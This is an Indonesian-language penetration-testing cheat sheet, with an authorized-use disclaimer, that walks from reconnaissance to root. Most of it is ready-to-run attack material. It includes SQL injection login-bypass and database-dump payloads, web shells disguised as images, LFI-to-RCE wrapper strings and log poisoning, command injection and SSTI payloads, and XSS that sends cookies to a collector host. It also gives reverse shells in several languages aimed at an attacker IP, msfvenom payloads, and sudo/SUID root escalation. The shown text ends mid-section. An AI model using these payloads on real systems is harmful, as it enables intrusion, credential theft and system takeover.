# 🛡️ Cheat Sheet — PT 2026

> Referensi sintaks penetration testing lengkap, disusun mengikuti alur kerja pentest standar.
>
> **Alur:** Recon (nmap) → Web Enum → Foothold → Reverse Shell + Stabilize → Enumeration → Privilege Escalation → Proof
>
> ⚠️ **Hanya untuk pengujian yang DIOTORISASI** (lab training, sistem milik sendiri, atau dengan izin tertulis). Penggunaan tanpa izin adalah ilegal.

---

## 📑 Daftar Isi

- [00 — Reconnaissance](#00--reconnaissance)
  - [Network Discovery](#network-discovery)
  - [Port Scanning & Banner Grabbing](#port-scanning--banner-grabbing)
  - [Web Directory Bruteforce](#web-directory-bruteforce)
  - [Virtual Host / Subdomain Enumeration](#virtual-host--subdomain-enumeration)
  - [Information Disclosure (robots.txt, headers, .git)](#information-disclosure)
  - [Vulnerability Scanning & Fingerprinting](#vulnerability-scanning--fingerprinting)
- [01 — Initial Foothold](#01--initial-foothold)
  - [SQL Injection](#sql-injection)
  - [File Upload Bypass](#file-upload-bypass)
  - [Local File Inclusion (LFI) & PHP Wrappers](#local-file-inclusion-lfi--php-wrappers)
  - [Command Injection](#command-injection)
  - [SSTI](#ssti-server-side-template-injection)
  - [Stored XSS + Exfiltration](#stored-xss--exfiltration)
  - [Brute Force & Service Login](#brute-force--service-login)
  - [Service Access (FTP / SSH)](#service-access-ftp--ssh)
  - [Password & SSH Key Cracking](#password--ssh-key-cracking)
- [02 — Reverse Shell](#02--reverse-shell)
  - [Listener](#listener)
  - [Reverse Shell Payloads](#reverse-shell-payloads)
  - [msfvenom](#msfvenom)
  - [Web Shells](#web-shells)
  - [Stabilize TTY](#stabilize-tty)
- [03 — Enumeration](#03--enumeration)
- [04 — Privilege Escalation](#04--privilege-escalation)
- [05 — Proof / Reporting](#05--proof--reporting)
- [Tooling: Burp Suite & Proxy](#tooling-burp-suite--proxy)
- [Lampiran: Encoding & Utility](#lampiran-encoding--utility)

---

# 00 — Reconnaissance

Fase pengintaian: petakan permukaan serangan (attack surface) sebelum menyerang. Tujuannya menemukan port terbuka, servis, versi software, path tersembunyi, dan virtual host.

## Network Discovery

**Untuk apa:** menemukan host yang hidup di jaringan sebelum scan mendalam.

```bash
# Ping sweep — cari host hidup di subnet
nmap -sn 192.168.1.0/24

# Cek satu host hidup / latency
nmap -sn <TARGET>

# ARP scan (jaringan lokal, lebih akurat)
netdiscover -r 192.168.1.0/24
arp-scan --localnet
```

## Port Scanning & Banner Grabbing

**Untuk apa:** menemukan port terbuka + identifikasi servis/versi. Versi software adalah kunci mencari CVE. Banner grabbing membaca "sapaan" servis yang sering membocorkan nama & versi.

```bash
# Scan cepat port umum + deteksi versi
nmap -sV --open <TARGET>

# Scan SEMUA port (1-65535) + versi — temukan servis non-standar/legacy
nmap -sV -p- --open <TARGET>

# Full scan agresif (lebih cepat) — script default + versi
nmap -sV -sC -p- --open --min-rate=5000 <TARGET>

# Banner grabbing satu port spesifik (servis kirim data duluan)
nmap -p 7773 --script=banner <TARGET>

# Scan port + jalankan NSE vuln scripts (deteksi kerentanan known)
nmap -p- --open -A --script vuln <TARGET>

# Cek security headers HTTP (HSTS, CSP, X-Frame-Options, dll)
nmap -p 80,443 --script http-security-headers <TARGET>
nmap -p 80,443 --script http-headers <TARGET>

# Banner grab manual dengan netcat — servis legacy kirim banner saat konek
nc -v <TARGET> 7773
telnet <TARGET> 7773

# Simpan output ke file (agar banner panjang tidak terpotong di terminal)
nmap -p 7773 --script=banner <TARGET> -oN hasil_scan.txt
cat hasil_scan.txt

# Grab banner semua port terbuka sekaligus (loop)
for port in $(nmap -p- --open <TARGET> | grep open | awk '{print $1}' | cut -d'/' -f1); do
  echo "=== Port $port ==="
  timeout 2 bash -c "echo | nc -v <TARGET> $port" 2>&1 | head -5
done
```

| Flag nmap | Fungsi |
|-----------|--------|
| `-sV` | Deteksi versi servis |
| `-sC` | Jalankan script NSE default |
| `-p-` | Scan semua 65535 port |
| `--open` | Tampilkan hanya port terbuka |
| `--min-rate=5000` | Percepat (paket/detik) |
| `-oN file` | Simpan output normal ke file |
| `--script=banner` | Ambil banner servis |

## Web Directory Bruteforce

**Untuk apa:** menemukan file & direktori tersembunyi yang tidak ter-link dari halaman manapun (panel admin, backup, config, endpoint API).

```bash
# ffuf — fuzzing direktori
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u "http://<TARGET>:8083/FUZZ" \
  -mc 200,301,302,401,403

# gobuster — alternatif direktori
gobuster dir -u http://<TARGET>:8083/ \
  -w /usr/share/wordlists/dirb/common.txt -t 30

# dirb — scanner klasik, rekursif otomatis
dirb http://<TARGET>
dirb http://<TARGET>:8080 -X .php,.html,.txt        # ekstensi spesifik
dirb http://<TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# feroxbuster — cepat, rekursif, ditulis dengan Rust
feroxbuster -u http://<TARGET>:8080/ -w /usr/share/wordlists/dirb/common.txt

# dirsearch — populer, output rapi
dirsearch -u http://<TARGET>
dirsearch -u http://<TARGET>:8080 -w /usr/share/wordlists/dirb/common.txt

# Cari ekstensi spesifik (php, txt, bak)
ffuf -w wordlist.txt -u "http://target/FUZZ" -e .php,.txt,.bak,.zip,.old

# Cek folder upload umum secara manual
for dir in uploads upload files attachment lampiran media assets images tmp; do
  echo "=== /$dir/ ==="
  curl -s -o /dev/null -w "%{http_code}\n" "http://<TARGET>:8083/$dir/"
done
```

| Flag | Fungsi |
|------|--------|
| `-w` | Path wordlist |
| `-u` | URL target (FUZZ = titik injeksi) |
| `-mc` | Match HTTP status code (tampilkan) |
| `-fc` | Filter (sembunyikan) status code |
| `-fs` | Filter berdasarkan ukuran response |
| `-e` | Tambahkan ekstensi |

**ffuf lanjutan — POST body, header, & parameter fuzzing:**

**Untuk apa:** fuzzing bukan cuma direktori — bisa tebak field POST (login/search), nilai header, atau nama parameter GET/POST tersembunyi.

```bash
# Fuzz POST body (mis. brute username + password field sekaligus)
ffuf -w users.txt:UFUZZ -w pass.txt:PFUZZ \
  -X POST -d "username=UFUZZ&password=PFUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u "http://<TARGET>/login.php" -fc 401

# Fuzz nilai POST tunggal (mis. cari id valid) + filter ukuran
ffuf -w wordlist.txt -X POST -d "id=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u "http://<TARGET>/api.php" -fs 0

# Parameter mining — temukan nama parameter GET tersembunyi
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://<TARGET>/index.php?FUZZ=test" -fw 42

# Fuzz nilai header (mis. X-Forwarded-For bypass 403)
ffuf -w ip_list.txt -H "X-Forwarded-For: FUZZ" -u "http://<TARGET>/admin" -fc 403

# Rekursif + auto-kalibrasi filter (buang response noise otomatis)
ffuf -w wordlist.txt -u "http://<TARGET>/FUZZ" -recursion -recursion-depth 2 -ac
```

| Flag ffuf lanjutan | Fungsi |
|--------------------|--------|
| `-X POST -d` | Method + body request |
| `-w file:KEY` | Multi-wordlist (cluster bomb) |
| `-mode clusterbomb\|pitchfork` | Mode kombinasi multi-wordlist |
| `-ac` | Auto-calibrate (filter noise otomatis) |
| `-recursion` | Fuzz folder temuan secara rekursif |
| `-fw` | Filter berdasarkan jumlah kata |

## Virtual Host / Subdomain Enumeration

**Untuk apa:** satu server bisa melayani banyak situs di port sama, dibedakan lewat header `Host`. Sering ada dev/staging environment tersembunyi yang lupa dimatikan.

```bash
# Buat wordlist vhost sederhana
cat > vhost.txt << 'EOF'
dev
staging
test
old
admin
api
internal
production
qa
sandbox
backup
EOF

# Fuzzing Host header dengan ffuf — bandingkan ukuran response
ffuf -w vhost.txt \
  -H "Host: FUZZ.ncd.local" \
  -u "http://<TARGET>:8079/" \
  -fc 404

# Filter berdasarkan jumlah kata (buang response identik)
ffuf -w vhost.txt -H "Host: FUZZ.ncd.local" \
  -u "http://<TARGET>:8079/" -fw 50

# Test vhost yang ditemukan
curl -v -H "Host: staging.ncd.local" http://<TARGET>:8079/

# Atau set /etc/hosts lalu akses via browser
echo "167.71.205.28 staging.ncd.local" | sudo tee -a /etc/hosts
```

**Tips:** lihat dulu ukuran response "normal" (`curl -s ... | wc -c`), lalu cari yang **beda sendiri** — itu vhost target.

## Information Disclosure

**Untuk apa:** informasi bocor lewat file/header yang jarang diperiksa. Sering jadi entry point mudah.

```bash
# robots.txt — daftar path yang justru disembunyikan developer
curl http://<TARGET>:8079/robots.txt

# Lihat SEMUA response header (Server, X-Powered-By, versi software)
curl -I http://<TARGET>:8079/
curl -v http://<TARGET>:8079/
curl -s -D - http://<TARGET>:8079/ -o /dev/null      # header saja, buang body
curl -sv http://<TARGET>:8079/ 2>&1 | grep -i "^< "

# Alat lain untuk baca header
wget --server-response --spider http://<TARGET>/     # wget mode header
http --headers <TARGET>                               # HTTPie
printf "HEAD / HTTP/1.1\r\nHost: <TARGET>\r\n\r\n" | nc <TARGET> 80   # manual

# .git terekspos — recover full source code dari version control
git-dumper http://target/.git/ ./output_folder
# Alternatif tanpa git-dumper:
wget -r -np -R "index.html*" http://target/.git/

# Baca history git yang sudah di-dump
git --git-dir=./dump-raw log --all --oneline

# File config environment (.env) — sering berisi kredensial DB & token
curl http://<TARGET>:8079/.env

# Dokumentasi API terekspos (swagger)
curl -s http://<TARGET>:8085/api/swagger.json | jq

# Changelog/version file — bocorkan versi & perubahan
curl http://<TARGET>:8085/CHANGELOG.txt
```

## Vulnerability Scanning & Fingerprinting

**Untuk apa:** identifikasi teknologi & kerentanan known secara otomatis sebelum eksploitasi manual.

```bash
# nuclei — deteksi CVE/misconfig berbasis template (paling efektif)
nuclei -u http://<TARGET>
nuclei -u http://<TARGET> -severity medium,high,critical
nuclei -u http://<TARGET> -tags cve,exposure

# nikto — scanner web klasik (file berbahaya, config lemah)
nikto -h http://<TARGET>

# whatweb — fingerprint teknologi (CMS, framework, versi)
whatweb <TARGET>

# httpx — probe cepat + info (title, status, server, teknologi)
echo <TARGET> | httpx -title -status-code -server -tech-detect

# searchsploit — cari exploit lokal berdasarkan servis/versi
searchsploit vsftpd 2.3.4
searchsploit -p 17491                # tampilkan path + salin exploit

# wpscan — khusus WordPress (enumerasi user, plugin, brute-force)
wpscan --url http://<TARGET>/secret --enumerate u
wpscan --url http://<TARGET>/secret -U admin -P /usr/share/wordlists/rockyou.txt

# enum4linux — enumerasi SMB/Samba (user, share, OS)
enum4linux <TARGET>
```

---

# 01 — Initial Foothold

Fase mendapatkan pijakan awal: eksploitasi kerentanan aplikasi web untuk eksekusi kode atau akses data.

## SQL Injection

**Untuk apa:** menyisipkan query SQL lewat input yang tidak difilter — bypass login, dump database, ekstraksi kredensial.

### Authentication Bypass

**Untuk apa:** login tanpa kredensial valid dengan meng-comment-out pengecekan password.

```sql
' OR '1'='1
' OR 1=1-- -
admin'-- -
admin'#
' OR '1'='1'-- -
```

Payload di field username, misal `admin'-- -` membuat query jadi `SELECT * FROM users WHERE username='admin'-- ...` (sisa query jadi komentar).

### UNION-Based Injection (Manual)

**Untuk apa:** menggabungkan hasil query lain (tabel manapun) ke output halaman — dump data dari kolom & baris yang normalnya tak terlihat.

```bash
# 1. Cari jumlah kolom query asli (naikkan sampai error)
curl "http://target/sqli/lab2_union.php?id=1 ORDER BY 1"
curl "http://target/sqli/lab2_union.php?id=1 ORDER BY 2"
curl "http://target/sqli/lab2_union.php?id=1 ORDER BY 3"   # error di sini = 2 kolom

# 2. Cari kolom mana yang di-reflect ke halaman
curl "http://target/sqli/lab2_union.php?id=-1 UNION SELECT 1,2,3"

# 3. Info database saat ini
curl "http://target/sqli/lab2_union.php?id=-1 UNION SELECT 1,database(),3"

# 4. List semua tabel di database
curl "http://target/sqli/lab2_union.php?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()"

# 5. List kolom dari tabel 'users'
curl "http://target/sqli/lab2_union.php?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'"

# 6. Dump username:password (plaintext!)
curl "http://target/sqli/lab2_union.php?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),3 FROM users"
```

> **Catatan:** `-1` (id invalid) memastikan hasil UNION yang tampil. `GROUP_CONCAT()` menggabungkan banyak baris jadi satu output. Spasi di URL sebaiknya di-encode `%20`.

### sqlmap (Otomatis)

**Untuk apa:** otomasi deteksi & eksploitasi SQLi, dump database tanpa payload manual.

```bash
# Deteksi + list database
sqlmap -u "http://target/search.php?q=test" -p q --dbs --batch

# List tabel dari database tertentu
sqlmap -u "http://target/search.php?q=test" -D gazette --tables --batch

# Dump tabel (SPECIFY kolom manual jika enumerate error 500)
sqlmap -u "http://target/news/detail?id=1" \
  -D gazette -T users -C id,username,password,role --dump --batch --threads=1

# Dump semua isi tabel
sqlmap -u "http://target/search.php?q=test" -D gazette -T users --dump --batch

# Dengan Basic Auth
sqlmap -u "http://target/lab2.php?id=1" --auth-type=Basic --auth-cred="training:passwd" --dbs

# Dengan cookie / session
sqlmap -u "http://target/search.php?q=test" --cookie="PHPSESSID=abc123" --dbs

# Dengan CSRF token
sqlmap -u "http://target/search.php?q=test" \
  --csrf-url="http://target/search.php" --csrf-token="_xsrf" -p q --dbs

# Bersihkan session lama jika nyangkut
sqlmap -u "http://target/..." --flush-session

# Bypass WAF/filter dengan tamper script + naikkan level deteksi
sqlmap -u "http://target/search.php?q=a" --tamper=space2comment --level=2 --batch
sqlmap -u "http://target/search.php?q=a" --tamper=space2comment --level=2 -D nusalog --dump
```

**Tamper scripts umum:** `space2comment` (spasi→komentar), `between` (bypass `>`/`=`), `charencode` (URL-encode), `randomcase`, `apostrophemask`.

**Troubleshooting error 500 saat enumerate kolom:**
```bash
sqlmap -u "http://target/news/detail?id=1" \
  -D gazette -T users -C username,password --dump --batch \
  --technique=T --time-sec=2 --delay=1 --threads=1 --no-cast
```

| Flag | Fungsi |
|------|--------|
| `-p` | Parameter yang diinjeksi |
| `--dbs` | List semua database |
| `-D/-T/-C` | Pilih database/tabel/kolom |
| `--dump` | Ekstrak data |
| `--batch` | Auto-jawab semua prompt |
| `--technique=BEUSTQ` | Boolean, Error, Union, Stacked, Time, inline-Query |
| `--technique=T` | Time-based (paling stabil bila error-based rusak) |
| `--no-cast` | Skip casting (hindari error 500) |
| `--threads=1` | Single-thread (server tak overload) |
| `--flush-session` | Reset cache sesi target |

## File Upload Bypass

**Untuk apa:** mengunggah web shell (PHP) dengan menyamarkannya agar lolos filter upload, lalu dieksekusi server.

### Teknik Bypass Ekstensi

**Untuk apa:** filter sering hanya cek ekstensi. Gunakan varian yang lolos blacklist tapi tetap dieksekusi Apache.

```
shell.php.png        ← double-ext (Apache AddHandler bug: eksekusi karena ada .php)
shell.phtml          ← ekstensi PHP alternatif
shell.pht
shell.phar
shell.php5
shell.php7
shell.pHp            ← case bypass (blacklist case-sensitive)
shell.php.            ← trailing dot
shell.php%00.png     ← null byte (PHP lama < 5.3.4)
```

### Bypass MIME / Magic Bytes

**Untuk apa:** server cek `Content-Type` atau magic byte awal file. Palsukan jadi gambar.

```
Content-Type: image/png     ← set di request multipart

# Isi body diawali magic byte gambar lalu kode PHP:
‰PNG
<?php system($_GET['cmd']); ?>

# GIF magic (paling ringan):
GIF89a
<?php system($_GET['cmd']); ?>
```

### Bypass via .htaccess

**Untuk apa:** bila whitelist ketat (hanya gambar), upload `.htaccess` agar ekstensi gambar dieksekusi sebagai PHP.

```apache
# Isi file .htaccess yang di-upload:
AddType application/x-httpd-php .png
# atau
AddHandler application/x-httpd-php .png
```

```bash
# Alur: 1) upload .htaccess  2) upload shell.png  3) akses
curl "http://target/uploads/shell.png?cmd=id"
```

> ⚠️ `.htaccess` hanya jalan bila Apache `AllowOverride` ≠ None, dan harus di folder yang sama dengan shell.

### Diagnosa Filter

```
# Kirim 2 test untuk tahu blacklist vs whitelist:
filename="test.png"   → jika LOLOS = blacklist (pakai .phtml/.php.png)
filename="test.xyz"   → jika DITOLAK juga = whitelist (pakai .htaccess)
```

### Cari File yang Sudah Ter-upload

```bash
# Response sering hanya kasih ID — buka halaman konfirmasi untuk path
curl -s "http://target/confirmation.php?id=172"     # cari href/src ke uploads/

# Brute-force folder upload
ffuf -w common.txt -u "http://target/FUZZ" -mc 200,301,403
```

## Local File Inclusion (LFI) & PHP Wrappers

**Untuk apa:** parameter yang meng-`include` file tanpa validasi → baca file sistem, baca source code, hingga RCE.

### Path Traversal Dasar

**Untuk apa:** membaca file di luar web root (mis. `/etc/passwd`).

```bash
curl "http://target/debug_viewer.php?path=../../../../etc/passwd"
curl "http://target/?page=....//....//....//etc/passwd"     # bypass filter ../
curl "http://target/?page=../../../../etc/passwd%00"        # null byte (PHP lama)

# Fuzzing parameter LFI dengan ffuf (temukan parameter rentan)
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u "http://target/website.php?FUZZ=/etc/passwd" -fs 80

# File menarik lain
../../../../etc/apache2/sites-enabled/000-default.conf     # config vhost
../../../../var/www/html/.env                               # kredensial
../../../../root/.ssh/id_rsa                                # SSH private key
../../../../proc/self/environ                               # env variables proses
../../../../proc/self/cmdline                               # command line proses
```

### php://filter — Baca Source Code

**Untuk apa:** membaca source code PHP tanpa dieksekusi (di-encode base64), untuk analisis logic & cari kredensial.

```bash
curl "http://target/debug_viewer.php?path=php://filter/convert.base64-encode/resource=index.php"
# decode hasilnya:
curl -s "http://target/debug_viewer.php?path=php://filter/convert.base64-encode/resource=config.php" | base64 -d
```

### data:// & expect:// — RCE Langsung

**Untuk apa:** eksekusi kode langsung (butuh `allow_url_include=On` untuk data://).

```bash
# data:// (URL-encoded agar curl tidak menolak)
curl "http://target/?page=data://text/plain,%3C%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%3F%3E&cmd=id"
# versi base64:
curl "http://target/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id"

# expect:// (butuh ekstensi expect)
curl "http://target/?page=expect://id"
```

### PHP Filter Chain — RCE tanpa allow_url_include ⭐

**Untuk apa:** teknik modern paling ampuh untuk `include $path` ketika `allow_url_include=Off` dan log tak terbaca. Membangun PHP code dari nol lewat rantai filter iconv.

```bash
# Clone generator
git clone https://github.com/synacktiv/php_filter_chain_generator.git
cd php_filter_chain_generator

# Generate chain untuk payload webshell
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

# Tempel output ke path=, tambah &cmd= di luar chain
curl "http://target/debug_viewer.php?path=<FILTER_CHAIN>&cmd=id"
```

### Log Poisoning — RCE via Log

**Untuk apa:** menyuntik PHP ke log server lalu meng-include-nya. (Sering gagal di Debian: log `root:adm 640`, www-data tak bisa baca.)

```bash
# 1. Inject PHP ke access log lewat User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target/"
# 2. Include log-nya
curl "http://target/?page=/var/log/apache2/access.log&cmd=id"
```

### PHP Session Poisoning

**Untuk apa:** alternatif log poisoning; www-data BISA baca file session.

```bash
curl -b "PHPSESSID=evil" -A "<?php system(\$_GET['cmd']);?>" "http://target/"
curl -b "PHPSESSID=evil" "http://target/?page=/var/lib/php/sessions/sess_evil&cmd=id"
```

## Command Injection

**Untuk apa:** input yang diteruskan ke shell OS tanpa validasi → eksekusi perintah sistem (mis. tool "ping" diagnostik).

```bash
# Operator penggabung perintah (di field input)
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 || id
$(id)
`id`
127.0.0.1%0aid           # newline (URL-encoded)

# Contoh netdiag admin panel — grep flag di seluruh web root
8.8.8.8; grep -R NCD /var/www

# Jika spasi difilter, gunakan ${IFS}
127.0.0.1;cat${IFS}/etc/passwd
```

## SSTI (Server-Side Template Injection)

**Untuk apa:** injeksi ke template engine → RCE. Deteksi dulu dengan probe matematika.

```bash
# Deteksi (jika muncul 49 = vulnerable)
{{7*7}}          # Jinja2/Twig
${7*7}           # Freemarker/JSP
<%= 7*7 %>       # ERB (Ruby)
#{7*7}           # Ruby lain

# RCE Jinja2 (Python/Flask)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# RCE Twig (PHP)
{{ ['id'] | filter('system') }}
```

## Stored XSS + Exfiltration

**Untuk apa:** menyimpan script jahat di halaman (mis. buku tamu tanpa filter); saat admin membukanya, curi cookie/session ke server kita (webhook).

```html
<!-- Curi cookie admin ke webhook collector -->
<script>
fetch('http://<TARGET>:8085/api/collect.php?token=k3y_w3bh00k_9f21&data='+document.cookie)
</script>

<!-- Alternatif image beacon -->
<img src=x onerror="this.src='http://COLLECTOR/?c='+document.cookie">

<!-- Exfil ke listener sendiri -->
<script>new Image().src='http://IP_KALI:8000/?c='+btoa(document.cookie)</script>
```

```bash
# Lihat hasil tangkapan di collector
curl "http://<TARGET>:8085/api/collect.php?token=k3y_w3bh00k_9f21&view=1"

# Pakai session curian (session hijacking) — ganti cookie di request
curl -b "session_id=CURIAN" "http://target/admin/"
```

## Brute Force & Service Login

**Untuk apa:** menebak kredensial pada servis (SSH, FTP, HTTP form) menggunakan wordlist.

```bash
# Hydra — SSH brute force
hydra -l jan -P /usr/share/wordlists/rockyou.txt <TARGET> ssh -vV -f -t 4
hydra -L user.txt -P /wordlist.txt <TARGET> ssh

# Hydra — HTTP POST form (login web)
hydra -l admin -P rockyou.txt <TARGET> http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid"

# Hydra — FTP
hydra -l user -P rockyou.txt <TARGET> ftp
```

| Flag Hydra | Fungsi |
|------------|--------|
| `-l` / `-L` | Username tunggal / list |
| `-p` / `-P` | Password tunggal / list |
| `-f` | Stop saat login pertama ketemu |
| `-t` | Jumlah thread paralel |
| `-vV` | Verbose (tampilkan tiap percobaan) |

## Service Access (FTP / SSH)

**Untuk apa:** login & akses servis setelah dapat kredensial.

```bash
# FTP — konek, list, ambil file
ftp <TARGET>
> ls
> get dataku.txt
> binary                # mode biner untuk file non-teks

# SSH — login biasa & dengan private key
ssh user@<TARGET>
ssh -i id_rsa alpha@<TARGET>
chmod 600 id_rsa        # WAJIB: SSH tolak key yang permission-nya terlalu terbuka
```

## Password & SSH Key Cracking

**Untuk apa:** memecahkan hash password atau passphrase private key SSH yang ditemukan.

```bash
# --- Crack passphrase SSH private key ---
# 1. Konversi key jadi format hash john
locate ssh2john.py
python3 ssh2john.py id_rsa > id_rsa.hash
# 2. Crack dengan wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
# 3. Lihat hasil
cat ~/.john/john.pot

# --- Crack hash password ---
john --single hash.txt                                    # mode cepat (berbasis username)
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 hash.txt
john --incremental --format=raw-sha256 hash.txt           # brute-force murni
john --format=crypt --wordlist=rockyou.txt hash.txt       # hash unix crypt

# hashcat (GPU, lebih cepat)
hashcat -m 0 hash.txt rockyou.txt        # -m 0 = MD5
hashcat -m 100 hash.txt rockyou.txt      # -m 100 = SHA1
hashcat -m 1400 hash.txt rockyou.txt     # -m 1400 = SHA256
```

---

# 02 — Reverse Shell

Fase mendapatkan shell interaktif dari target ke mesin penyerang.

## Listener

**Untuk apa:** membuka port di mesin penyerang untuk menerima koneksi balik dari target.

```bash
# Netcat listener (paling umum)
nc -lvnp 4444

# Rlwrap (biar bisa panah atas/bawah & history)
rlwrap nc -lvnp 4444

# Metasploit handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"

# Pwncat (listener modern, auto-stabilize)
pwncat-cs -lp 4444

# Metasploit — cari & jalankan exploit modul (mis. vsftpd 2.3.4)
msfconsole
> search vsftpd 2.3.4
> use 0
> show options
> set RHOSTS <TARGET>
> run
```

## Reverse Shell Payloads

**Untuk apa:** perintah yang dijalankan DI TARGET agar konek balik ke listener kita. Ganti `IP`/`PORT` dengan milik penyerang.

```bash
# Bash
bash -i >& /dev/tcp/IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'

# Netcat
nc -e /bin/bash IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f   # tanpa -e

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

> **Referensi lengkap:** [revshells.com](https://www.revshells.com) — generator interaktif semua bahasa.

## msfvenom

**Untuk apa:** generate file payload (reverse shell/meterpreter) dalam berbagai format & platform.

```bash
# PHP Meterpreter (untuk target PHP/web — LFI/upload)
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php
sed -i '1s;^;<?php ;' shell.php     # pastikan ada tag <?php di awal

# PHP reverse sederhana (bisa pakai nc biasa)
msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw > shell.php

# Linux ELF binary
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf

# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe

# Disamarkan jadi gambar (bypass upload)
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > payload.php
(echo -n -e '\x89PNG\r\n'; echo '<?php '; cat payload.php) > shell.php.png
```

| Bagian | Arti |
|--------|------|
| `-p` | Payload (platform/jenis) |
| `LHOST` | IP penyerang yang **reachable dari target** (IP `tun0` jika VPN lab) |
| `LPORT` | Port listener |
| `-f` | Format output (raw/elf/exe/...) |

> ⚠️ `LHOST` salah = shell tak konek. Cek: `ip a show tun0` (VPN) atau `curl ifconfig.me` (publik). Bila Kali di NAT tanpa VPN, **reverse shell tak akan konek** — pakai web shell.

## Web Shells

**Untuk apa:** eksekusi perintah lewat HTTP tanpa listener/IP reachable — paling praktis untuk ambil flag di target web.

```php
<?php system($_GET['cmd']); ?>                 // ?cmd=id
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo `$_GET[cmd]`; ?>                     // backtick operator
<?php system($_POST['cmd']); ?>                // POST (tak masuk log URL)
```

```bash
# Buat & pakai
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl "http://target/shell.php?cmd=id"
curl "http://target/shell.php?cmd=grep+-rR+'NCD{'+/var/www"

# Webshell bawaan Kali (pentestmonkey) — edit IP/PORT sebelum pakai
locate php-reverse-shell.php
tree /usr/share/webshells/                    # lihat semua webshell tersedia
cp -a /usr/share/webshells/php ~/              # salin untuk diedit
nano ~/php/php-reverse-shell.php              # ganti $ip & $port
```

## Stabilize TTY

**Untuk apa:** upgrade shell "dumb" (tanpa tab-complete, Ctrl-C mematikan) jadi TTY penuh yang nyaman.

```bash
# 1. Spawn PTY via python
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 2. Background shell
Ctrl+Z
# 3. Di Kali: set raw mode & foreground
stty raw -echo; fg
# 4. Di shell target:
export TERM=xterm
stty rows 38 columns 116     # sesuaikan ukuran terminal

# Alternatif dengan script
/usr/bin/script -qc /bin/bash /dev/null
```

---

# 03 — Enumeration

**Untuk apa:** setelah dapat shell, kumpulkan info untuk privilege escalation — cari misconfig, kredensial, SUID, cron, kernel version.

```bash
# Otomatis — LinPEAS (paling lengkap)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# atau transfer & jalankan
wget http://IP_KALI:8000/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh; /tmp/lp.sh

# Manual — siapa saya & hak akses
id; whoami; sudo -l

# Info sistem & kernel (untuk kernel exploit)
uname -a; cat /etc/os-release

# Cari SUID binary (privesc potensial)
find / -perm -4000 -type f 2>/dev/null

# Cari file writable oleh user
find / -writable -type f 2>/dev/null | grep -v proc

# Cron jobs
cat /etc/crontab; ls -la /etc/cron.*

# Kredensial di file config
grep -rniE "password|passwd|secret|api_key|token" /var/www 2>/dev/null

# Proses berjalan & port internal
ps aux; netstat -tulpn 2>/dev/null || ss -tulpn

# History & env
cat ~/.bash_history; env
```

**Untuk apa:** [GTFOBins](https://gtfobins.github.io) — referensi cara abuse binary Unix (sudo/SUID) untuk privesc & escape.

---

# 04 — Privilege Escalation

**Untuk apa:** naik dari user biasa ke root.

## Sudo Misconfiguration

**Untuk apa:** abuse perintah yang boleh dijalankan via sudo (lihat `sudo -l`).

```bash
sudo -l                          # lihat apa yang boleh
sudo /bin/bash                   # jika diizinkan langsung
sudo find . -exec /bin/sh \; -quit   # abuse find (GTFOBins)
sudo vim -c ':!/bin/sh'          # abuse vim
sudo env /bin/sh                 # abuse env
```

## SUID Binary

**Untuk apa:** binary ber-SUID root dieksekusi dengan hak root. Cek di GTFOBins.

```bash
find / -perm -4000 -type f 2>/dev/null
# contoh abuse:
./nmap --interactive        # (nmap versi lama) lalu !sh
/usr/bin/find . -exec /bin/sh -p \; -quit
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p   # jika bisa buat SUID
```

## Writable Cron

**Untuk apa:** jika ada cron root menjalankan script yang writable, sisipkan perintah kita.

```bash
cat /etc/crontab
# jika script cron writable:
